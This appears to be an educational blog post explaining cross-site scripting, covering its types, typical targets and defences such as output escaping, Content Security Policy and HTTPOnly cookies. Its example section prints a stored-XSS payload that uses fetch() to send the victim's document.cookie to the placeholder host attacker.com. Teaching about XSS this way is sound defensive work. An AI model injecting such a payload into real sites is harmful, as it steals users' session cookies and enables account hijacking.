---
draft: false
date: 2016-11-01
title: 'Understanding XSS: How Cross-Site Scripting Attacks Work'
tags: ['info-sec', 'xss', 'javascript']
summary: 'Cross-Site Scripting (XSS) is a common web vulnerability where attackers inject malicious scripts into trusted websites. This guide explains how XSS works, particularly stored XSS, and how attackers can steal user data by tricking the browser into executing malicious code.'
---

### Introduction

**XSS (Cross-Site Scripting)** is a **web security vulnerability** that allows an attacker to inject **malicious scripts** (usually JavaScript) into **trusted websites**. When a user loads the affected page, the malicious script runs in **their browser**, potentially stealing data or performing actions on their behalf.

---

### 🔍 What does XSS do?

The attacker tricks the site into delivering malicious code (not data) to the user's browser. That code can:

- 🕵️‍♂️ Steal cookies/session tokens
- 📤 Exfiltrate form data
- 👨‍💻 Perform actions as the user (like clicking buttons or changing settings)
- 🪝 Log keystrokes
- 💣 Spread malware

---

### 🎯 Common Targets:

- Input fields (comments, forms)
- URLs and parameters
- Search bars
- User profiles

---

### 🔥 Types of XSS

| Type              | Description                                                                        | Stored in DB? | Executes When?                |
| ----------------- | ---------------------------------------------------------------------------------- | ------------- | ----------------------------- |
| **Stored XSS**    | Malicious script is **saved** (e.g. in a comment or post) and shown to others.     | ✅ Yes        | When victim **views** it      |
| **Reflected XSS** | Script is part of the **URL or form input**, immediately reflected in response.    | ❌ No         | When victim **clicks** a link |
| **DOM-based XSS** | The malicious code is injected **via JavaScript** that manipulates the page (DOM). | ❌ No         | When JS on page executes it   |

---

### 🛡️ How to Prevent XSS

1. **Escape user input**: Encode output to prevent it from being treated as HTML/JS.
2. **Use Content Security Policy (CSP)**: Restrict what scripts can run.
3. **Sanitize input**: Strip or reject dangerous HTML/JS.
4. **HTTPOnly cookies**: Prevent scripts from accessing sensitive cookies.
5. **Framework protections**: Use modern frameworks (React, Angular, etc.) which auto-escape.

---

### 🧠 Simple Example of XSS

Imagine a comment box on a website. A user submits this:

```html
<script>
  fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>
```

If the website **doesn't sanitize or encode** this input, the script will run in another user's browser — stealing their session cookie.

---

### Conclusion

| Term       | Meaning                                                                  |
| ---------- | ------------------------------------------------------------------------ |
| **XSS**    | Cross-Site Scripting — injecting malicious scripts into trusted websites |
| **Goal**   | Execute code in another user's browser                                   |
| **Impact** | Data theft, account hijack, defacement                                   |
| **Fix**    | Sanitize/escape input, use CSP, secure coding practices                  |

---
